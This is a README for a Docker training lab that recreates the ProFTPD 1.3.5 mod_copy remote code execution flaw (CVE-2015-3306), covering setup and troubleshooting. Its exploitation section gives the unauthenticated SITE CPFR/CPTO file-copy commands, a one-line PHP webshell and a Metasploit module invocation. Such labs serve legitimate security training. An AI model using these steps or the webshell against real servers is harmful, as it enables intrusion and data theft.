# ProFTPD 1.3.5 mod_copy RCE Lab 🎯

A cybersecurity exercise environment demonstrating the Remote Code Execution (RCE) vulnerability in ProFTPD 1.3.5 with the mod_copy module enabled (CVE-2015-3306).

## 🚨 Disclaimer

**This lab is for educational and authorized testing purposes only.** Do not use these techniques on systems you do not own or have explicit permission to test. Unauthorized access to computer systems is illegal.

## 📋 Overview

This lab provides:
- A vulnerable ProFTPD 1.3.5 server with mod_copy enabled
- A web server (Apache) running on the same container
- A modern web interface for managing the lab environment
- Network isolation for safe exploitation practice

## 🔧 Prerequisites

- Docker and Docker Compose installed
- Kali Linux or similar penetration testing OS (for exploitation)
- Basic understanding of FTP and web services

## 🚀 Quick Start

### 1. Clone or Download the Lab

```bash
cd proftpd-lab
```

### 2. Build and Start the Lab

```bash
# Build and start all services
docker-compose up --build -d

# View running containers
docker ps
```

### 3. Access the Web Interface

Open your browser and navigate to:
```
http://localhost
```

### 4. Access the Vulnerable Services

- **FTP Service**: `ftp://localhost:2121` (or use the container IP: `172.25.0.10:21`)
- **Web Service**: `http://localhost:8081` (or use the container IP: `172.25.0.10:80`)

## 🎮 Using the Lab

### Web Interface Features

The web interface provides:
- **Start Exercise Button**: Simulates container deployment (in production, this would spawn actual containers)
- **IP Display**: Shows the victim machine's IP address
- **Copy Function**: Easy clipboard copy of the victim IP

### Direct Container Access

If you prefer to work directly with the container:

```bash
# Get container IP
docker inspect proftpd-vulnerable | grep IPAddress

# Test FTP connection
ftp 172.25.0.10 21
```

## 💣 Exploitation Guide

### Understanding the Vulnerability

ProFTPD 1.3.5's mod_copy module implements `SITE CPFR` and `SITE CPTO` commands that allow unauthenticated users to copy files from any readable location to any writable location on the server.

### Basic Exploitation Steps

1. **Connect to the FTP service** (no authentication required):
```bash
nc 172.25.0.10 21
# or
telnet 172.25.0.10 21
```

2. **Use mod_copy commands** to copy files:
```
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

3. **Access the copied file** via web browser:
```
http://172.25.0.10/passwd.txt
```

### Advanced Exploitation - RCE

To achieve Remote Code Execution:

1. **Create a PHP webshell locally**:
```php
<?php system($_GET['cmd']); ?>
```

2. **Upload to FTP** (if anonymous upload is enabled) or use existing PHP files

3. **Copy to web directory** using mod_copy

4. **Execute commands** via the webshell

### Using Metasploit

```bash
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.25.0.10
set RPORT 21
set SITEPATH /var/www/html
exploit
```

## 🔍 Lab Architecture

```
proftpd-lab/
├── victim/                 # Vulnerable container configuration
│   ├── Dockerfile         # Container build instructions
│   ├── proftpd.conf      # ProFTPD configuration (mod_copy enabled)
│   └── startup.sh        # Service initialization script
├── web/                   # Web interface
│   ├── index.html        # Three-column layout interface
│   ├── styles.css        # Modern styling
│   └── script.js         # Container management simulation
├── docker-compose.yml     # Container orchestration
├── nginx.conf            # Web server configuration
└── README.md             # This file
```

## 🛠️ Configuration Details

### ProFTPD Configuration

Key vulnerable settings in `proftpd.conf`:
```
LoadModule mod_copy.c
<IfModule mod_copy.c>
  CopyEngine on
</IfModule>
```

### Network Configuration

- **Lab Network**: `172.25.0.0/16`
- **Victim Container**: `172.25.0.10`
- **Web Interface**: `172.25.0.5`

### Port Mappings

| Service | Container Port | Host Port |
|---------|---------------|-----------|
| FTP     | 21           | 2121      |
| HTTP    | 80           | 8081      |
| Web UI  | 80           | 80        |

## 🧹 Cleanup

To stop and remove all lab components:

```bash
# Stop all containers
docker-compose down

# Remove containers and networks
docker-compose down --volumes

# Remove all lab images
docker rmi proftpd-lab_victim nginx:alpine
```

## 🔐 Security Notes

- This lab runs in Docker containers for isolation
- The vulnerable service is intentionally misconfigured
- Do not expose this lab to the internet
- Use only in controlled environments

## 🐛 Troubleshooting

### Container won't start
```bash
# Check logs
docker-compose logs victim

# Rebuild from scratch
docker-compose down -v
docker-compose build --no-cache
docker-compose up -d
```

### FTP connection refused
```bash
# Check if ProFTPD is running
docker exec proftpd-vulnerable ps aux | grep proftpd

# Restart the container
docker restart proftpd-vulnerable
```

### Web interface not loading
```bash
# Check nginx logs
docker-compose logs web-interface

# Verify file permissions
ls -la web/
```

## 📚 References

- [CVE-2015-3306 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306)
- [ProFTPD mod_copy Documentation](http://www.proftpd.org/docs/contrib/mod_copy.html)
- [Exploit Database Entry](https://www.exploit-db.com/exploits/37262)

## 📝 License

This educational lab is provided as-is for learning purposes. Use responsibly and ethically.

## 🤝 Contributing

Feel free to submit issues or pull requests to improve the lab environment.

---

**Remember**: With great power comes great responsibility. Use your skills ethically! 🛡️
